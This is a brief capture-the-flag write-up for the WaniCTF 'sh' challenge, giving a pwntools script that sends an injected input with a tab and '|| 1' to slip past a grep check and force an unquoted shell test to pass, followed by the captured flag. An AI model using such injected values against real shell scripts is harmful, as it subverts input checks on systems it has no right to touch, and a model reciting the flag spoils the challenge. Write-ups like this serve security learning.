https://ctftime.org/event/2377

# sh (misc)

shellscript without double quotes

## Solution

```python
from pwn import *

r = remote("chal-lz56g6.wanictf.org", "7580")
r.sendline(f"0\t|| 1")
r.interactive()
```

- 0 to pass the grep check
- \t to trick printf, not fully sure how it works but i saw in some testcase on busybox
- || 1 to make test always true

## Flag
`FLAG{use_she11check_0r_7he_unexpec7ed_h4ppens}`

shafouz 2024/06/23
